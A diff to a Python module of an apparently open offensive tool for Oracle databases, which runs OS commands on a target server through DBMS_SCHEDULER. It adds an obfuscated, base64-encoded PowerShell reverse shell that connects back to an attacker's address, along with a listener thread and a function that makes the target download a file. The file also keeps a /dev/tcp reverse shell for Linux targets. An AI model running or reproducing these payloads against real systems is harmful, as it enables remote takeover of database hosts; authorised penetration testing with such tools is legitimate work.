@@ -7,11 +7,17 @@ from Utils import ErrorSQLRequest, checkOptionsGivenByTheUser
 from Constants import *
 from time import sleep
 from threading import Thread
+import base64
 
 class DbmsScheduler (OracleDatabase):
 	'''
 	Allow the user to execute a command on the remote database system with DBMS_SCHEDULER
 	'''
+
+	R_SHELL_COMMAND_POWERSHELL_PAYLOAD = 'function ReverseShellClean {{if ($c.Connected -eq $true) {{$c.Close()}}; if ($p.ExitCode -ne $null) {{$p.Close()}}; exit; }};$a="{0}"; $port="{1}";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process ;$p.StartInfo.FileName="cmd.exe" ;$p.StartInfo.RedirectStandardInput=1 ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){{$out += $e.GetString($os.Read())}} $s.Write($e.GetBytes($out),0,$out.Length);$out=$null;$done=$false;while (-not $done) {{if ($c.Connected -ne $true) {{cleanup}} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {{ $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {{break}}}}  if ($pos -gt 0){{ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {{ReverseShellClean}} else {{  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){{ $out += $e.GetString($os.Read());if ($out -eq $string) {{$out=" "}}}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}}}} else {{ReverseShellClean}}}};'  # {0} IP, {1} port
+	R_SHELL_COMMAND_POWERSHELL = "powershell.exe -EncodedCommand {0}"  # {0} powershell code base64 encoded
+	SIZE_LIMIT_ARG = 1024 # Size max of an argument with set_job_argument_value
+
 	def __init__(self,args):
 		'''
 		Constructor
@@ -20,6 +26,8 @@ class DbmsScheduler (OracleDatabase):
 		OracleDatabase.__init__(self,args)
 		self.jobName = None
 		self.CMD_WIND_PATH = "c:\windows\system32\cmd.exe"
+		self.PS_X86_PATH = """C:\windows\syswow64\windowspowershell\\v1.0\powershell.exe"""
+		self.PS_X64_PATH = """C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe"""
 
 	def __removeJob__(self, jobName, force=False, defer=True):
 		'''
@@ -157,8 +165,17 @@ class DbmsScheduler (OracleDatabase):
 		Need upload nc.exe if the remote system is windows
 		'''
 		if self.remoteSystemIsWindows() == True :
-			logging.warn("Java reverse shell is not implement for Windows yet")
-			pass
+			CMD = self.getReverseShellPowershellCommand(localip, localport)
+			logging.debug('The following command will be executed on the target: {0}'.format(CMD))
+			self.args['print'].goodNews("The powershell reverse shell tries to connect to {0}:{1}".format(localip, localport))
+			a = Thread(None, self.__runListenNC__, None, (), {'port': localport})
+			a.start()
+			try:
+				self.execOSCommand(cmd=CMD)
+			except KeyboardInterrupt:
+				self.args['print'].goodNews("Connection closed")
+			self.__getJobStatus__()
+			self.__removeJob__(self.jobName, force=False, defer=True)
 		elif self.remoteSystemIsLinux() == True :
 			#PYTHON_CODE = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""".format(localip, localport)
 			PYTHON_CODE = """import os; os.system('exec 5<>/dev/tcp/{0}/{1}; /bin/cat <&5 | while read line; do $line 2>&5 >&5; done');""".format(localip, localport)
@@ -175,7 +192,29 @@ class DbmsScheduler (OracleDatabase):
 			self.__removeJob__(self.jobName, force=False, defer=True)
 		else :
 			logging.error("The remote server OS ({0}) is unknown".format(self.remoteOS.lower()))
-		
+
+	def getReverseShellPowershellCommand(self, localip, localport):
+		'''
+		Return powershell reverse shell complete command (obfuscated)
+		:return: string (to execute)
+		'''
+		cmdAndPayload = self.R_SHELL_COMMAND_POWERSHELL.format(base64.b64encode("".join([c + '\x00' for c in self.R_SHELL_COMMAND_POWERSHELL_PAYLOAD.format(localip, localport)]).encode('utf-8')))
+		return cmdAndPayload
+
+	def makeDownloadFile(self, urlToFile, remoteFilePath):
+		'''
+		Make the target download local file localFilePath to remoteFilePath
+		:param localFile:
+		:return:
+		'''
+		PS_CODE_DOWNLOAD = """$c=new-object System.Net.WebClient;$c.DownloadFile("{0}", "{1}")"""#{0}urlToFile, {1}urlToFile
+		ps_code = PS_CODE_DOWNLOAD.format(urlToFile, remoteFilePath).encode('UTF-16LE')
+		ps_code_encoded = base64.b64encode(ps_code).decode('utf-8')
+		cmdAndPayload = "{0} -EncodedCommand {1}".format(self.PS_X64_PATH, ps_code_encoded)
+		self.execOSCommand(cmd=cmdAndPayload)
+		self.__getJobStatus__()
+		self.__removeJob__(self.jobName, force=False, defer=True)
+
 	def testAll (self):
 		'''
 		Test all functions
@@ -196,7 +235,7 @@ def runDbmsSchedulerModule(args):
 	Run the DBMSAdvisor module
 	'''
 	status = True
-	if checkOptionsGivenByTheUser(args,["test-module","exec","reverse-shell"]) == False : return EXIT_MISS_ARGUMENT
+	if checkOptionsGivenByTheUser(args,["test-module","exec","reverse-shell","make-download"]) == False : return EXIT_MISS_ARGUMENT
 	dbmsScheduler = DbmsScheduler(args)
 	status = dbmsScheduler.connection(stopIfError=True)
 	if args['test-module'] == True :
@@ -216,6 +255,10 @@ def runDbmsSchedulerModule(args):
 	if args['reverse-shell'] != None :
 		args['print'].title("Try to give you a reverse shell from the {0} server".format(args['server']))
 		dbmsScheduler.giveReverseShell(localip=args['reverse-shell'][0],localport=args['reverse-shell'][1])
+	# Option 2: make target download a local file
+	if args['make-download'] != None:
+		args['print'].title("Try to make the target {0} download local file {1} with powershell, and saved it in {2}".format(args['server'], args['make-download'][0], args['make-download'][1]))
+		dbmsScheduler.makeDownloadFile(urlToFile=args['make-download'][0], remoteFilePath=args['make-download'][1])
 	dbmsScheduler.close()
 
 
